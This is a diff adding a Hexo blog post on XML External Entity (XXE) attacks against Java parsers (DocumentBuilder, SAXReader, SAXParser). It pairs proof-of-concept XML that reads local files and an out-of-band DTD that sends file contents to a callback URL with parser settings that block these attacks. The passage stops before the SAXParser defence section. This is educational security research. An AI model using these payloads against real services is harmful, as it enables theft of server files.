@@ -1,0 +1,2064 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Yoga7xm">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Yoga7xm">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>XXE in Java · Yoga7xm&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/human.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Yoga7xm&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">XXE in Java</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Yoga7xm's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            XXE in Java
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "java">java</a>
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "xxe">xxe</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/02/17</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>之前接触的XXE基本都是php的，但是libxml在2.9.0以后，默认不解析外部实体…所以来看看Java中XXE的情况</p>
+<p>XML-DTD文件格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 内部普通实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 外部普通实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 内部参数实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 外部参数实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h2><p>DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。</p>
+<p>测试XML数据：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo SYSTEM "http://127.0.0.1:8080/xxe.dtd" &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Kobe<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>James<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&amp;tmp;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试DTD数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY tmp SYSTEM &quot;file:///e://1.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试Demo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dbuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"test.xml"</span>);</span><br><span class="line">        <span class="comment">//DocumentBuilderFactory是一个抽象工厂类，不能直接实例化</span></span><br><span class="line">        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取Dom模式解析对象</span></span><br><span class="line">            DocumentBuilder builder = factory.newDocumentBuilder();</span><br><span class="line">            <span class="comment">//读取xml文件</span></span><br><span class="line">            Document document = builder.parse(file);</span><br><span class="line">            <span class="comment">//获取名为 message 节点</span></span><br><span class="line">            NodeList nodeList = document.getElementsByTagName(<span class="string">"message"</span>);</span><br><span class="line">            Element e = (Element) nodeList.item(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//根据节点名称获取值</span></span><br><span class="line">            System.out.println(<span class="string">"To: "</span> + e.getElementsByTagName(<span class="string">"to"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"From: "</span> + e.getElementsByTagName(<span class="string">"from"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"Text: "</span> + e.getElementsByTagName(<span class="string">"text"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行一下</p>
+<p><img src="/2020/02/17/javaxxe/db.png" alt></p>
+<p>成功加载外部实体文件并读取<code>1.txt</code>文件内容</p>
+<p>网上流传最广的一种（伪）修复方法是：<code>factory.setExpandEntityReferences(false);</code>我们尝试添加这个配置项进去</p>
+<p>【注】：这里要说明下，设置配置项需要放在实例化DocumentBuilder之前，如果顺序反了是没有用的</p>
+<p><img src="/2020/02/17/javaxxe/set.png" alt></p>
+<p>然后运行</p>
+<p><img src="/2020/02/17/javaxxe/oob.png" alt></p>
+<p>OOB攻击成功，但是使用通用回显的payload仍然会去访问dtd文件，最后回显内容为<code>NULL</code>。方法注释定义如是说到：</p>
+<blockquote>
+<p>Specifies that the parser produced by this code will<br>expand entity reference nodes. By default the value of this is set to<br><code>true</code></p>
+<p>@param expandEntityRef true if the parser produced will expand entity<br>reference nodes; false otherwise.</p>
+<p>此方法作用于XML解析后生成的文档。setExpandEntityReferences设置为true则展开实体引用到生成的文档中替换掉&amp;xx的实体引用声明，setExpandEntityReferences设置为false则保留实体引用声明的DOM树在生成的文档中</p>
+</blockquote>
+<p>举个例子来说</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe &quot;test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;document&gt; </span><br><span class="line">    &lt;title&gt;&amp;xxe;&lt;/title&gt; </span><br><span class="line">&lt;/document&gt;</span><br></pre></td></tr></table></figure>
+
+<p>设置了setExpandEntityReferences为true（默认）的时候，解析后生成的文档树的结构是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+- document</span><br><span class="line">    +- title</span><br><span class="line">    |  +- #text：test</span><br></pre></td></tr></table></figure>
+
+<p>如果设置为false，那么结构为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+- document</span><br><span class="line">    +- title</span><br><span class="line">    |  +- xxe</span><br><span class="line">    |  +- #text：test</span><br></pre></td></tr></table></figure>
+
+<p>所以说这个设置是作用于解析之后的文档，对防御XXE并没有什么用处</p>
+<p><strong>官方防御</strong></p>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">传送门</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 禁止加载外部实体</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// 禁止加载参数实体</span></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// 禁止加载外部DTD</span></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>一般来说禁用DTD就能防御大多数下的XXE</p>
+<p><strong>非官方防御</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FEATURE = <span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/17/javaxxe/error.png" alt></p>
+<h2 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h2><blockquote>
+<p>Flexible XML framework for Java.</p>
+</blockquote>
+<p>测试Demo(需下载<a href="https://dom4j.github.io/" target="_blank" rel="noopener">dom4j.jar</a>然后添加到项目中)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.dom4j.Document;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.DocumentException;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.Element;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaxReader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> DocumentException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"xxe.xml"</span>);</span><br><span class="line">        SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Document document = saxReader.read(file);</span><br><span class="line">            Element root = document.getRootElement();</span><br><span class="line">            List&lt;Element&gt; childs = root.elements();</span><br><span class="line">            <span class="keyword">for</span> (Element child : childs) &#123;</span><br><span class="line">                String name = child.getName();</span><br><span class="line">                String value = child.getText();</span><br><span class="line">                System.out.println(name + <span class="string">":"</span> + value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">        &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:8080/xxe.dtd&quot;&gt;</span><br><span class="line">        %remote;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;message&gt;</span><br><span class="line">    &lt;to&gt;Kobe&lt;/to&gt;</span><br><span class="line">    &lt;from&gt;James&lt;/from&gt;</span><br><span class="line">    &lt;text&gt;&amp;tmp;&lt;/text&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行代码</p>
+<p><img src="/2020/02/17/javaxxe/saxr.png" alt></p>
+<p>【注】：加载外部dtd需要在根元素中的声明中加载，才会触发XXE</p>
+<p><strong>防御</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">builder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">Document doc = builder.build(InputSource);</span><br></pre></td></tr></table></figure>
+
+<p>然后运行所有的poc均报错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.dom4j.DocumentException: Error on line <span class="number">2</span> of document file:<span class="comment">///E:/javademo/light/oob.xml : 将功能 "http://apache.org/xml/features/disallow-doctype-decl" 设置为“真”时, 不允许使用 DOCTYPE。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SAXParser"><a href="#SAXParser" class="headerlink" title="SAXParser"></a>SAXParser</h2><p>测试Demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.HandlerBase;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaxPaser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParser saxParser = saxParserFactory.newSAXParser();</span><br><span class="line">            saxParser.parse(file, (HandlerBase) <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">        &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:8080/bypass.dtd&quot;&gt;</span><br><span class="line">        %remote;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;message&gt;</span><br><span class="line">    &lt;to&gt;Kobe&lt;/to&gt;</span><br><span class="line">    &lt;from&gt;James&lt;/from&gt;</span><br><span class="line">    &lt;text&gt;&amp;internal;&lt;/text&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///e://1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://127.0.0.1:8080/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p>运行查看结果</p>
+<p><img src="/2020/02/17/javaxxe/saxp.png" alt></p>
+<p>显然OOB攻击成功，我们来看官方给出来的防御手段</p>
